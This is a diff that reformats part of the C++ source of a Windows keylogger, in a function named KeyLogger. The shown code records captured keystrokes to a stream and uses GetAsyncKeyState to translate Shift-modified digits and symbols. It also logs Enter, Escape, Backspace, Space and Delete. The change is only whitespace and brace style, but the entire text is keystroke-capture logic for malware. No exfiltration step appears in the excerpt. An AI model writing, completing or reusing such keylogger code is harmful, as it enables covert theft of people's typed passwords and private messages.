@@ -44,110 +44,183 @@ void KeyLogger(void)
                     write << character;
                 }
 
-                // Shift keys 
+                // Shift keys
 
-                switch (character){
-                    case 45:{
-                        if(GetAsyncKeyState(0x10) & 0x8000){
-                            write << "_";
-                        }else {write << character;}
-                        break;
+                switch (character)
+                {
+                case 45:
+                {
+                    if (GetAsyncKeyState(0x10) & 0x8000)
+                    {
+                        write << "_";
                     }
-                    case 48:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << ")";
-                        }else {write << character;}
-                        break;
+                    else
+                    {
+                        write << character;
                     }
-                    case 49:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "!";
-                        }else {write << character;}
-                        break;
+                    break;
+                }
+                case 48:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << ")";
                     }
-                    case 50:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "@";
-                        }else {write << character;}
-                        break;
+                    else
+                    {
+                        write << character;
                     }
-                    case 51:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "#";
-                        }else {write << character;}
-                        break;
+                    break;
+                }
+                case 49:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "!";
                     }
-                    case 52:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "$";
-                        }else {write << character;}
-                        break;
+                    else
+                    {
+                        write << character;
                     }
-                    case 53:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "%";
-                        }else {write << character;}
-                        break;
+                    break;
+                }
+                case 50:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "@";
                     }
-                    case 54:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "^";
-                        }else {write << character;}
-                        break;
+                    else
+                    {
+                        write << character;
                     }
-                    case 55:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "&";
-                        }else {write << character;}
-                        break;
+                    break;
+                }
+                case 51:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "#";
                     }
-                    case 56:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "*";
-                        }else {write << character;}
-                        break;
+                    else
+                    {
+                        write << character;
                     }
-                    case 57:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "(";
-                        }else {write << character;}
-                        break;
+                    break;
+                }
+                case 52:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "$";
                     }
-                    case 61:{
-                        if(GetAsyncKeyState(0x10)){
-                            write << "+";
-                        }else {write << character;}
-                        break;
+                    else
+                    {
+                        write << character;
                     }
+                    break;
+                }
+                case 53:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "%";
+                    }
+                    else
+                    {
+                        write << character;
+                    }
+                    break;
+                }
+                case 54:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "^";
+                    }
+                    else
+                    {
+                        write << character;
+                    }
+                    break;
+                }
+                case 55:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "&";
+                    }
+                    else
+                    {
+                        write << character;
+                    }
+                    break;
+                }
+                case 56:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "*";
+                    }
+                    else
+                    {
+                        write << character;
+                    }
+                    break;
+                }
+                case 57:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "(";
+                    }
+                    else
+                    {
+                        write << character;
+                    }
+                    break;
+                }
+                case 61:
+                {
+                    if (GetAsyncKeyState(0x10))
+                    {
+                        write << "+";
+                    }
+                    else
+                    {
+                        write << character;
+                    }
+                    break;
+                }
                 }
 
                 switch (character)
                 {
-                    case 8: // 8 means backspace.
-                    {
-                        write << "\b";
-                    }
-                    break;
-                    case 13: // 13 is for tthe "Enter Key"
-                    {
-                        write << " <Enter> " << std::endl;
-                    }
-                    break;
-                    case 27: // 27 is for the "Escape key"
-                    {
-                        write << " <ESC> ";
-                    }
-                    break;
-                    case 32: // 32 is for the "Space key"
-                    {
-                        write << " ";
-                    }
-                    break;
-                    case 127: // 127 is for the "Delete key"
-                    {
-                        write << " <Delete> ";
-                    }
-                    break;
+                case 8: // 8 means backspace.
+                {
+                    write << "\b";
+                }
+                break;
+                case 13: // 13 is for tthe "Enter Key"
+                {
+                    write << " <Enter> " << std::endl;
+                }
+                break;
+                case 27: // 27 is for the "Escape key"
+                {
+                    write << " <ESC> ";
+                }
+                break;
+                case 32: // 32 is for the "Space key"
+                {
+                    write << " ";
+                }
+                break;
+                case 127: // 127 is for the "Delete key"
+                {
+                    write << " <Delete> ";
+                }
+                break;
                 }
             }
         }
